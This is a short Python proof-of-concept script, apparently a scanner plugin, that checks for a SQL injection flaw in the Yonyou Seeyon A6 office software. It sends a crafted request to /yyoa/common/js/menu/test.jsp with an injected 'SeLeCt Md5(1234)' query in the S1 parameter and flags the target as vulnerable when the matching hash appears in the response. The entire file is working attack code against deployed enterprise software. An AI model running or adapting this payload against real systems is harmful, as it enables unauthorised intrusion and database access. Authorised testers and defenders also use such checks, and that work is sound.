#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友致远A6 test.jsp SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0155953
author: Lucifer
description: /yyoa/common/js/menu/test.jsp 文件中S1 参数存在注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['用友致远A6 test.jsp SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/yyoa/common/js/menu/test.jsp?doType=101&S1=SeLeCt%20Md5(1234)"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
